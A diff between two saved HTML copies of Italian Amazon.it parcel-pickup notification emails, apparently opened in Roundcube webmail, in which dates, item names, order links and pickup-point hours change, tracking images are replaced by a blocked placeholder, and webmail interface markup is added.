-                         <td class="v1DisplayComponents" valign="top" align="left" style="color: #002F36; font-family: Arial, sans-serif; font-size: 20px; line-height: 20px; line-height: 24px; letter-spacing: -.5px"> 3 gennaio </td> 
+                         <td class="v1DisplayComponents" valign="top" align="left" style="color: #002F36; font-family: Arial, sans-serif; font-size: 20px; line-height: 20px; line-height: 24px; letter-spacing: -.5px"> 7 gennaio </td> 
                           
                         </tr> 
                         <tr> 
-                         <td height="6" style="min-width: 1; line-height: 6px"> <img src="./qwe_files/sp.gif" width="1" height="6" style="display: block; border: none"> </td> 
+                         <td height="6" style="min-width: 1; line-height: 6px"> <img src="./qwe_files/blocked.gif" width="1" height="6" style="display: block; border: none"> </td> 
                         </tr> 
                         <tr> 
                          <td class="v1DisplayComponents" valign="top" align="left" style="color: #868686; font-family: Arial, sans-serif; font-size: 15px; line-height: 15px; line-height: 18px; letter-spacing: -.5px"> Dopo questa data il pacco verrà restituito automaticamente ad Amazon e riceverai un rimborso totale </td> 
@@ -512,7 +453,7 @@ cursor:default!important}
                       </table> </td> 
                     </tr> 
                     <tr> 
-                     <td height="35" style="min-width: 1; line-height: 35px"> <img src="./qwe_files/sp.gif" width="1" height="35" style="display: block; border: none"> </td> 
+                     <td height="35" style="min-width: 1; line-height: 35px"> <img src="./qwe_files/blocked.gif" width="1" height="35" style="display: block; border: none"> </td> 
                     </tr> 
                    </tbody>
                   </table></td>
@@ -522,18 +463,18 @@ cursor:default!important}
                   <table class="v1InfoBlock" style="border-collapse: collapse; border-spacing: 0; padding: 0; border: 0; text-align: center; width: 296px; max-width: 296px"> 
                    <tbody>
                     <tr> 
-                     <td style="text-align: left; vertical-align: top; width: 27px; border: none; padding-right: 21px"> <img src="./qwe_files/Pin.png" alt="delivery" width="36" style="display: block; border: none"> </td> 
+                     <td style="text-align: left; vertical-align: top; width: 27px; border: none; padding-right: 21px"> <img src="./qwe_files/blocked.gif" alt="delivery" width="36" style="display: block; border: none"> </td> 
                      <td align="left" valign="top"> 
                       <table class="v1InfoBlockInner" style="border-collapse: collapse; border-spacing: 0; padding: 0; border: 0; text-align: center; width: 100%; max-width: 100%"> 
                        <tbody>
                         <tr> 
-                         <td height="3" style="min-width: 1; line-height: 3px"> <img src="./qwe_files/sp.gif" width="1" height="3" style="display: block; border: none"> </td> 
+                         <td height="3" style="min-width: 1; line-height: 3px"> <img src="./qwe_files/blocked.gif" width="1" height="3" style="display: block; border: none"> </td> 
                         </tr> 
                         <tr> 
                          <td class="v1DisplayComponents" valign="top" align="left" style="color: #868686; font-family: Arial, sans-serif; font-size: 15px; line-height: 15px; font-weight: bold"> PUNTO DI RITIRO </td> 
                         </tr> 
                         <tr> 
-                         <td height="8" style="min-width: 1; line-height: 8px"> <img src="./qwe_files/sp.gif" width="1" height="8" style="display: block; border: none"> </td> 
+                         <td height="8" style="min-width: 1; line-height: 8px"> <img src="./qwe_files/blocked.gif" width="1" height="8" style="display: block; border: none"> </td> 
                         </tr> 
                         <tr> 
                           
@@ -545,7 +486,7 @@ cursor:default!important}
                           
                         </tr> 
                         <tr> 
-                         <td height="6" style="min-width: 1; line-height: 6px"> <img src="./qwe_files/sp.gif" width="1" height="6" style="display: block; border: none"> </td> 
+                         <td height="6" style="min-width: 1; line-height: 6px"> <img src="./qwe_files/blocked.gif" width="1" height="6" style="display: block; border: none"> </td> 
                         </tr> 
                         <tr> 
                          <td class="v1DisplayComponents" valign="top" align="left" style="color: #868686; font-family: Arial, sans-serif; font-size: 15px; line-height: 15px; line-height: 18px; letter-spacing: -.5px"> Orari di apertura:
@@ -559,6 +500,14 @@ cursor:default!important}
                              <td style="padding-right: 10px"></td>
                              <td> 15:30 - 19:30</td>
                             </tr>
+                            <tr>
+                             <td style="padding-right: 10px">Sabato </td>
+                             <td> 08:00 - 13:00</td>
+                            </tr>
+                            <tr>
+                             <td style="padding-right: 10px"></td>
+                             <td> 15:30 - 19:30</td>
+                            </tr>
                            </tbody>
                           </table> <span style="color: #002F36"><br>(Gli orari di apertura potrebbero variare durante il periodo festivo)<br></span> </td> 
                         </tr> 
@@ -566,87 +515,81 @@ cursor:default!important}
                       </table> </td> 
                     </tr> 
                     <tr> 
-                     <td height="35" style="min-width: 1; line-height: 35px"> <img src="./qwe_files/sp.gif" width="1" height="35" style="display: block; border: none"> </td> 
+                     <td height="35" style="min-width: 1; line-height: 35px"> <img src="./qwe_files/blocked.gif" width="1" height="35" style="display: block; border: none"> </td> 
                     </tr> 
                    </tbody>
                   </table></td>
                 </tr> 
                 <tr>
-                 <td> <a href="https://www.amazon.it/gp/r.html?C=3PHUBNY4CC0BN&amp;K=1S0VQB24LR9XR&amp;M=urn:rtn:msg:202012241149359e4991f2f1ef40fda2f9a44b4750p0eu&amp;R=MOOKGNYSMAJU&amp;T=C&amp;U=https%3A%2F%2Fwww.amazon.it%2Fgp%2Fcss%2Fshiptrack%2Fview.html%3Fie%3DUTF8%26orderID%3D403-3907996-7249132%26orderingShipmentId%3D25518678611302%26packageId%3D1%26ref_%3Dpe_3310731_523154251_hedwig_ppp_received_email_track&amp;H=GMWZQKVXYLVMMWPLVD6MRU0TVLCA&amp;ref_=pe_3310731_523154251_hedwig_ppp_received_email_track" style="text-decoration: none" target="_blank" rel="noreferrer">
+                 <td> <a href="https://www.amazon.it/gp/r.html?C=3PHUBNY4CC0BN&amp;K=1S0VQB24LR9XR&amp;M=urn:rtn:msg:20201228102510e8daf99856934a99877660f09b20p0eu&amp;R=9ZRZKAWXZK5R&amp;T=C&amp;U=https%3A%2F%2Fwww.amazon.it%2Fgp%2Fcss%2Fshiptrack%2Fview.html%3Fie%3DUTF8%26orderID%3D403-1248728-8071531%26orderingShipmentId%3D22951217987302%26packageId%3D1%26ref_%3Dpe_3310731_523154251_hedwig_ppp_received_email_track&amp;H=NU7GPLNPMWOVQSYSGWDL9UWTAYIA&amp;ref_=pe_3310731_523154251_hedwig_ppp_received_email_track" style="text-decoration: none" target="_blank" rel="noreferrer">
                    <table class="v1InfoBlock" style="border-collapse: collapse; border-spacing: 0; padding: 0; border: 0; text-align: center; width: 296px; max-width: 296px"> 
                     <tbody>
                      <tr> 
-                      <td style="text-align: left; vertical-align: top; width: 27px; border: none; padding-right: 21px"> <img src="./qwe_files/box.png" alt="delivery" width="36" style="display: block; border: none"> </td> 
+                      <td style="text-align: left; vertical-align: top; width: 27px; border: none; padding-right: 21px"> <img src="./qwe_files/blocked.gif" alt="delivery" width="36" style="display: block; border: none"> </td> 
                       <td align="left" valign="top"> 
                        <table class="v1InfoBlockInner" style="border-collapse: collapse; border-spacing: 0; padding: 0; border: 0; text-align: center; width: 100%; max-width: 100%"> 
                         <tbody>
                          <tr> 
-                          <td height="3" style="min-width: 1; line-height: 3px"> <img src="./qwe_files/sp.gif" width="1" height="3" style="display: block; border: none"> </td> 
+                          <td height="3" style="min-width: 1; line-height: 3px"> <img src="./qwe_files/blocked.gif" width="1" height="3" style="display: block; border: none"> </td> 
                          </tr> 
                          <tr> 
                           <td class="v1DisplayComponents" valign="top" align="left" style="color: #868686; font-family: Arial, sans-serif; font-size: 15px; line-height: 15px; font-weight: bold"> ARTICOLI </td> 
                          </tr> 
                          <tr> 
-                          <td height="8" style="min-width: 1; line-height: 8px"> <img src="./qwe_files/sp.gif" width="1" height="8" style="display: block; border: none"> </td> 
+                          <td height="8" style="min-width: 1; line-height: 8px"> <img src="./qwe_files/blocked.gif" width="1" height="8" style="display: block; border: none"> </td> 
                          </tr> 
                          <tr> 
                            
                            
-                          <td class="v1DisplayComponents" valign="top" align="left" style="color: #002F36; font-family: Arial, sans-serif; font-size: 20px; line-height: 20px; line-height: 23px; letter-spacing: -.5px"> Hannabach 652727 Set Corde... </td> 
+                          <td class="v1DisplayComponents" valign="top" align="left" style="color: #002F36; font-family: Arial, sans-serif; font-size: 20px; line-height: 20px; line-height: 23px; letter-spacing: -.5px"> L'anomalie: roman </td> 
                            
-                         </tr> 
-                         <tr> 
-                          <td height="6" style="min-width: 1; line-height: 6px"> <img src="./qwe_files/sp.gif" width="1" height="6" style="display: block; border: none"> </td> 
-                         </tr> 
-                         <tr> 
-                          <td class="v1DisplayComponents" valign="top" align="left" style="color: #002F36; font-family: Arial, sans-serif; font-size: 18px; line-height: 18px"> +4 altri articoli </td> 
                          </tr> 
                         </tbody>
                        </table> </td> 
                      </tr> 
                      <tr> 
-                      <td height="35" style="min-width: 1; line-height: 35px"> <img src="./qwe_files/sp.gif" width="1" height="35" style="display: block; border: none"> </td> 
+                      <td height="35" style="min-width: 1; line-height: 35px"> <img src="./qwe_files/blocked.gif" width="1" height="35" style="display: block; border: none"> </td> 
                      </tr> 
                     </tbody>
                    </table> </a></td>
                 </tr> 
                 <tr> 
-                 <td class="v1DisplayComponents" valign="top" align="left" style="color: #868686; font-family: Arial, sans-serif; font-size: 15px; line-height: 15px; line-height: 18px; letter-spacing: -.5px"> Restituisci oppure ordina nuovamente utilizzando <a href="https://www.amazon.it/gp/r.html?C=3PHUBNY4CC0BN&amp;K=1S0VQB24LR9XR&amp;M=urn:rtn:msg:202012241149359e4991f2f1ef40fda2f9a44b4750p0eu&amp;R=1U9M4DZ3ZDCNG&amp;T=C&amp;U=https%3A%2F%2Fwww.amazon.it%2Fgp%2Fcss%2Forder-history%3Fref_%3Dpe_3310731_523154251_hedwig_ppp_received_email_order&amp;H=PEX8GWJXTJAVSYX0CUA763ZADWAA&amp;ref_=pe_3310731_523154251_hedwig_ppp_received_email_order" style="color: inherit; text-decoration: none; border-bottom: 2px solid #00DFFC" target="_blank" rel="noreferrer">I miei ordini</a> </td> 
+                 <td class="v1DisplayComponents" valign="top" align="left" style="color: #868686; font-family: Arial, sans-serif; font-size: 15px; line-height: 15px; line-height: 18px; letter-spacing: -.5px"> Restituisci oppure ordina nuovamente utilizzando <a href="https://www.amazon.it/gp/r.html?C=3PHUBNY4CC0BN&amp;K=1S0VQB24LR9XR&amp;M=urn:rtn:msg:20201228102510e8daf99856934a99877660f09b20p0eu&amp;R=3KR747LKRI5N3&amp;T=C&amp;U=https%3A%2F%2Fwww.amazon.it%2Fgp%2Fcss%2Forder-history%3Fref_%3Dpe_3310731_523154251_hedwig_ppp_received_email_order&amp;H=QQFCJCNANQTYU7A0LTG8QJ78B8CA&amp;ref_=pe_3310731_523154251_hedwig_ppp_received_email_order" style="color: inherit; text-decoration: none; border-bottom: 2px solid #00DFFC" target="_blank" rel="noreferrer">I miei ordini</a> </td> 
                 </tr> 
                 <tr> 
-                 <td height="24" style="min-width: 1; line-height: 24px"> <img src="./qwe_files/sp.gif" width="1" height="24" style="display: block; border: none"> </td> 
+                 <td height="24" style="min-width: 1; line-height: 24px"> <img src="./qwe_files/blocked.gif" width="1" height="24" style="display: block; border: none"> </td> 
                 </tr> 
                 <tr> 
-                 <td class="v1DisplayComponents" valign="top" align="left" style="color: #002F36; font-family: Arial, sans-serif; font-size: 18px; line-height: 18px; line-height: 23px; letter-spacing: -.5px"> <a href="https://www.amazon.it/gp/f.html?C=3PHUBNY4CC0BN&amp;K=1S0VQB24LR9XR&amp;M=urn:rtn:msg:202012241149359e4991f2f1ef40fda2f9a44b4750p0eu&amp;R=5DSSA0L6W70I&amp;T=C&amp;U=https%3A%2F%2Fwww.amazon.it%2FPUPsurvey_ReadyforPickup%3Fref_%3Dpe_3310731_523154251&amp;H=HLQMT8RUGDBTOQSA9PXMMFT3CQYA&amp;ref_=pe_3310731_523154251" style="color: inherit; text-decoration: none; border-bottom: 2px solid #00DFFC" target="_blank" rel="noreferrer">Raccontaci la tua esperienza!</a> </td> 
+                 <td class="v1DisplayComponents" valign="top" align="left" style="color: #002F36; font-family: Arial, sans-serif; font-size: 18px; line-height: 18px; line-height: 23px; letter-spacing: -.5px"> <a href="https://www.amazon.it/gp/f.html?C=3PHUBNY4CC0BN&amp;K=1S0VQB24LR9XR&amp;M=urn:rtn:msg:20201228102510e8daf99856934a99877660f09b20p0eu&amp;R=382C5WKJZ3NOK&amp;T=C&amp;U=https%3A%2F%2Fwww.amazon.it%2FPUPsurvey_ReadyforPickup%3Fref_%3Dpe_3310731_523154251&amp;H=EBIZAOIRAGTDA2IK42GTQRORM8WA&amp;ref_=pe_3310731_523154251" style="color: inherit; text-decoration: none; border-bottom: 2px solid #00DFFC" target="_blank" rel="noreferrer">Raccontaci la tua esperienza!</a> </td> 
                 </tr> 
                 <tr> 
-                 <td height="0" style="min-width: 1; line-height: 0px"> <img src="./qwe_files/sp.gif" width="1" height="0" style="display: block; border: none"> </td> 
+                 <td height="0" style="min-width: 1; line-height: 0px"> <img src="./qwe_files/blocked.gif" width="1" height="0" style="display: block; border: none"> </td> 
                 </tr> 
                </tbody>
               </table> 
               <table id="v1disclaimer" style="border-collapse: collapse; border-spacing: 0; padding: 0; border: 0; text-align: center; width: 296px; max-width: 296px" class="v1disclaimerText"> 
                <tbody>
                 <tr> 
-                 <td height="29" style="min-width: 1; line-height: 29px"> <img src="./qwe_files/sp.gif" width="1" height="29" style="display: block; border: none"> </td> 
+                 <td height="29" style="min-width: 1; line-height: 29px"> <img src="./qwe_files/blocked.gif" width="1" height="29" style="display: block; border: none"> </td> 
                 </tr> 
                 <tr> 
                  <td class="v1DisplayComponents" valign="top" align="left" style="color: #868686; font-family: Arial, sans-serif; font-size: 11px; line-height: 11px"> 
                   <hr><br> </td> 
                 </tr> 
                 <tr> 
-                 <td height="7" style="min-width: 1; line-height: 7px"> <img src="./qwe_files/sp.gif" width="1" height="7" style="display: block; border: none"> </td> 
+                 <td height="7" style="min-width: 1; line-height: 7px"> <img src="./qwe_files/blocked.gif" width="1" height="7" style="display: block; border: none"> </td> 
                 </tr> 
                 <tr> 
-                 <td class="v1DisplayComponents" valign="top" align="left" style="color: #868686; font-family: Arial, sans-serif; font-size: 11px; line-height: 11px"> Puoi scaricare la ricevuta cliccando <a href="https://www.amazon.it/gp/r.html?C=3PHUBNY4CC0BN&amp;K=1S0VQB24LR9XR&amp;M=urn:rtn:msg:202012241149359e4991f2f1ef40fda2f9a44b4750p0eu&amp;R=1TQAPNFGAAGJF&amp;T=C&amp;U=https%3A%2F%2Fwww.amazon.it%2Fgp%2Fcss%2Fsummary%2Fprint.html%3Fie%3DUTF8%26orderID%3D403-3907996-7249132%26ref_%3Dpe_3310731_523154251_hedwig_ppp_received_email_invoice&amp;H=Q4PAS1E4NYBC6TEY0EIWJAWSOFOA&amp;ref_=pe_3310731_523154251_hedwig_ppp_received_email_invoice" style="color: #0066c0; font-family: Arial, sans-serif; font-size: 11px; text-decoration: none" target="_blank" rel="noreferrer"> qui </a> </td> 
+                 <td class="v1DisplayComponents" valign="top" align="left" style="color: #868686; font-family: Arial, sans-serif; font-size: 11px; line-height: 11px"> Puoi scaricare la ricevuta cliccando <a href="https://www.amazon.it/gp/r.html?C=3PHUBNY4CC0BN&amp;K=1S0VQB24LR9XR&amp;M=urn:rtn:msg:20201228102510e8daf99856934a99877660f09b20p0eu&amp;R=164897WQ0BCCH&amp;T=C&amp;U=https%3A%2F%2Fwww.amazon.it%2Fgp%2Fcss%2Fsummary%2Fprint.html%3Fie%3DUTF8%26orderID%3D403-1248728-8071531%26ref_%3Dpe_3310731_523154251_hedwig_ppp_received_email_invoice&amp;H=ZAJIXLB8ZTJRSBWFBADDFVOAEAIA&amp;ref_=pe_3310731_523154251_hedwig_ppp_received_email_invoice" style="color: #0066c0; font-family: Arial, sans-serif; font-size: 11px; text-decoration: none" target="_blank" rel="noreferrer"> qui </a> </td> 
                 </tr> 
                 <tr> 
-                 <td height="7" style="min-width: 1; line-height: 7px"> <img src="./qwe_files/sp.gif" width="1" height="7" style="display: block; border: none"> </td> 
+                 <td height="7" style="min-width: 1; line-height: 7px"> <img src="./qwe_files/blocked.gif" width="1" height="7" style="display: block; border: none"> </td> 
                 </tr> 
                 <tr> 
                  <td class="v1DisplayComponents" valign="top" align="left" style="color: #868686; font-family: Arial, sans-serif; font-size: 11px; line-height: 11px"> Questa notifica è stata inviata da un indirizzo non programmato per la ricezione, non rispondere direttamente. Non rispondere a questo messaggio. </td> 
                 </tr> 
                 <tr> 
-                 <td height="29" style="min-width: 1; line-height: 29px"> <img src="./qwe_files/sp.gif" width="1" height="29" style="display: block; border: none"> </td> 
+                 <td height="29" style="min-width: 1; line-height: 29px"> <img src="./qwe_files/blocked.gif" width="1" height="29" style="display: block; border: none"> </td> 
                 </tr> 
                </tbody>
               </table> </td> 
@@ -656,7 +599,7 @@ cursor:default!important}
           <table style="border-collapse: collapse; border-spacing: 0; padding: 0; border: 0; text-align: center" class="v1container"> 
            <tbody>
             <tr> 
-             <td height="21" style="min-width: 1; line-height: 21px"> <img src="./qwe_files/sp.gif" width="1" height="21" style="display: block; border: none"> </td> 
+             <td height="21" style="min-width: 1; line-height: 21px"> <img src="./qwe_files/blocked.gif" width="1" height="21" style="display: block; border: none"> </td> 
             </tr> 
            </tbody>
           </table> </td> 
@@ -669,13 +612,13 @@ cursor:default!important}
           <table cellpadding="0" cellspacing="0" border="0" align="center" width="375"> 
            <tbody>
             <tr> 
-             <td height="1" style="line-height: 1px; min-width: 375px"> <img src="./qwe_files/sp.gif" height="1" width="375" style="max-height: 1px; min-height: 1px; display: block; width: 375px; min-width: 375px"> </td> 
+             <td height="1" style="line-height: 1px; min-width: 375px"> <img src="./qwe_files/blocked.gif" height="1" width="375" style="max-height: 1px; min-height: 1px; display: block; width: 375px; min-width: 375px"> </td> 
             </tr> 
            </tbody>
           </table> </td> 
         </tr> 
         <tr> 
-         <td class="v1hide"> <img src="./qwe_files/MagicPixel._V319790361_.png" height="1" width="375" style="max-height: 1px; min-height: 1px; display: block; width: 375px; min-width: 375px"> </td> 
+         <td class="v1hide"> <img src="./qwe_files/blocked.gif" height="1" width="375" style="max-height: 1px; min-height: 1px; display: block; width: 375px; min-width: 375px"> </td> 
         </tr> 
         <tr> 
          <td class="v1hide"> 
@@ -689,11 +632,32 @@ cursor:default!important}
     </tr> 
    </tbody>
   </table>  
- <img width="1" height="1" src="./qwe_files/r(1).html"></div>
+ <img width="1" height="1" src="./qwe_files/blocked.gif"></div>
 </div>
 </div>
 
 </div>
+</div>
+
+</div><!-- end mailview-right -->
+
+<div id="mailviewsplitterv" unselectable="on" role="presentation" class="splitter splitter-v" style="left: 203px; top: 0px;"></div></div><!-- end mainscreencontent -->
+
+</div><!-- end mainscreen -->
+
+<div id="attachmentmenu" class="popupmenu" aria-hidden="true">
+	<ul class="toolbarmenu" id="attachmentoptionsmenu" role="menu">
+		<li role="menuitem"><a id="attachmenuopen" class="icon" role="button" tabindex="-1" aria-disabled="true" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;open-attachment&#39;,&#39;&#39;,this,event)"><span class="icon extwin">Open</span></a></li>
+		<li role="menuitem"><a id="attachmenudownload" class="icon active" role="button" tabindex="0" aria-disabled="false" href="https://webmail.eu.com/roundcube/?_task=mail&amp;_action=show&amp;_uid=13909&amp;_mbox=INBOX&amp;_format=html#" onclick="return rcmail.command(&#39;download-attachment&#39;,&#39;&#39;,this,event)"><span class="icon download">Download</span></a></li>
+		
+	</ul>
+</div>
+
+<div id="messagestack"></div>
+
+<script>
+if (!window.UI) { var UI = new rcube_mail_ui(); }
+</script>
 <script>
 $(function() {
 rcmail.init();
@@ -703,4 +667,5 @@ rcmail.init();
 
 
 
-</body></html>
+
+<div id="managesieve-tip" class="popupmenu"></div></body></html>
